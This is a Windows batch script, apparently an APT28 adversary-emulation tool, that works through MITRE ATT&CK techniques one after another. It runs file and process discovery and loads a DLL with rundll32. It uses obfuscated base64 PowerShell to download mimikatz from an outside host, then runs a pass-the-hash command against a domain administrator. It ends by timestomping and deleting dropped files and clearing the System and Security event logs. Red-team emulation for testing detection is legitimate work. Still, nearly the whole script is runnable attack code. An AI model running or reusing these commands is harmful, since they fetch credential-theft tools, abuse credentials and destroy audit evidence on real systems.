@ECHO OFF
CLS
color 0E


ECHO -----------------------------------------
ECHO [-] Technique: Process Discovery (T1057)
ECHO [+] Process Discovery 
ECHO -----------------------------------------
cmd /c tasklist /v >> %temp%\APT28\pi.log
ECHO.



ECHO.
ECHO -----------------------------------------------------
ECHO [-] Technique: Remote File Copy (T1105)
ECHO [+] Simulates Remote File Copy via mapped drive "SMB"
ECHO -----------------------------------------------------
net use Z: \\live.sysinternals.com
COPY /Y "Z:\procdump.exe" %temp%\APT28\
ping 127.0.0.1 -n 4 > nul
cmd /c net use Z: /delete /Y
ECHO.



ECHO.
ECHO ---------------------------------------------------------------------
ECHO [-] Technique: File and Directory Discovery (T1083)
ECHO [+] Simulates discovery of specific file extensions using "forfiles"
ECHO ---------------------------------------------------------------------
for %%G in (.doc, .docx, .pdf) do (
  for /f "delims=" %%A in ('forfiles -p %USERPROFILE% /s /m *%%G /c "cmd /c echo @path"') do (
    ECHO %%A >> %temp%\APT28\T1083.txt 
  )
)
ECHO.



ECHO.
ECHO ---------------------------------------------------------------------
ECHO [-] Technique: Rundll32 (T1085) 
ECHO [+] Simulates use of "Rundll32" to load and execute suspicious DLL's
ECHO ---------------------------------------------------------------------
COPY /Y %utilities%\AllTheThingsx64.dll %PUBLIC%\
rundll32.exe %PUBLIC%\AllTheThingsx64.dll,EntryPoint
ECHO.



ECHO.
ECHO ---------------------------------------------------------------------------
ECHO [-] Technique: Scripting (T1064) 
ECHO [+] Simulates execution of remote Powershell script to download "mimikatz"
ECHO ---------------------------------------------------------------------------
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
if %OS%==32BIT powershell -nop -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABmAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAcgBlAHkAYwBlAGwALwBBAFAAVAAtAFMAaQBtAHUAbABhAHQAaQBvAG4ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AVQB0AGkAbABpAHQAaQBlAHMALwBtAGkAbQBpAGsAYQB0AHoAWAA4ADYALgBlAHgAZQAiACwAIgBDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABtAGkAbQBlAC4AZQB4AGUAIgApAA==
::Decode-Powershell
::[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatzX86.exe","$env:temp\APT28\mime.exe")
if %OS%==64BIT powershell -nop -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABmAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAcgBlAHkAYwBlAGwALwBBAFAAVAAtAFMAaQBtAHUAbABhAHQAaQBvAG4ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AVQB0AGkAbABpAHQAaQBlAHMALwBtAGkAbQBpAGsAYQB0AHoAWAA2ADQALgBlAHgAZQAiACwAIgBDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABtAGkAbQBlAC4AZQB4AGUAIgApAA==
ECHO.
ECHO.
::Decode-Powershell
::[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatzX64.exe","$env:temp\APT28\mime.exe")




ECHO.
ECHO -------------------------------------------------
ECHO [-] Technique: Pass the Hash (T1075)
ECHO [+] Simulates Path-the-Hash (PTH) using "mimikatz"
ECHO --------------------------------------------------
%temp%\APT28\mime.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:aria.com /ntlm:cc36gf7a8514793efccd3326464tkg1a" exit
ping 127.0.0.1 -n 3 > nul
ECHO.



ECHO.
ECHO ----------------------------------------------------
ECHO [-] Technique: Data Staged	(T1074)
ECHO [+] Collecting System Account and Group Information
ECHO ----------------------------------------------------
ECHO.
net Accounts >> "%temp%\APT28\pi1.log"
net localgroup administrators >> "%temp%\APT28\pi1.log"
net config workstation >> "%temp%\APT28\pi1.log"
net accounts >> "%temp%\APT28\pi1.log"
ECHO.




ECHO.
ECHO -------------------------------------------------------------------
ECHO [-] Technique: Timestomp	(T1099)
ECHO [+] Simulate Timestomping by modifing timestamps of dropped files
ECHO -------------------------------------------------------------------
ECHO.
%utilities%\timestomper -p2 %systemroot%\system.ini -p %temp%\APT28\ -r
ECHO.



ECHO.
ECHO ---------------------------------------
ECHO [-] Technique: File Deletion (T1107)
ECHO [+] Deleting files to cover the tracks
ECHO ---------------------------------------
xcopy /S /Y %utilities%\MessageBox32.dll %appdata%\
ping 127.0.0.1 -n 4 > nul
del /f "%appdata%\MessageBox32.dll"
del /f "%temp%\APT28\mime.exe"
del -f "%PUBLIC%\AllTheThingsx64.dll"
ECHO.



ECHO.
ECHO ------------------------------------------------
ECHO [-] Technique: Indicator Removal on Host (T1070)
ECHO [+] Clear Windows Event Logs to hide the tracks
ECHO ------------------------------------------------
wevtutil cl System
wevtutil cl Security
ECHO.


